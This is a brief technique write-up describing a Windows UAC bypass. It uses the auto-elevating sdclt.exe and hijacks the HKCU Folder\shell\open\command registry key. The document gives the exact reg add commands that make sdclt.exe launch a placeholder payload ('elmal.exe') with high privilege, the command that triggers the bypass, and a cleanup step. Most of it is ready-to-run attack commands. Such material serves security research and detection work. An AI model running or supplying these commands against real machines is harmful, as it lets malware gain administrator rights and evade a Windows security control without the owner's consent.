**Simple and effective UAC bypass**

##### TL;TR

Sdclt.exe is used in the context of Windows backup and restore mechanisms. You can check it auto-elevates using Sysinternals Sigcheck:
```
sigcheck.exe -m C:\Windows\System32\sdclt.exe | findstr autoElevate

<autoElevate  xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</autoElevate>
```
The method is fileless and is based on COM hijacking. Some interesting events which occur when sdclt.exe is called from a medium integrity process:
- It runs another process of sdclt.exe with high privilege
- The high privilege sdclt process calls C:\Windows\System32\control.exe
- Control.exe process runs with high privilege too.

```
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c elmal.exe" /f
reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
```
Execute:
```
%windir%\system32\sdclt.exe
```

Delete after play:
```
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
```
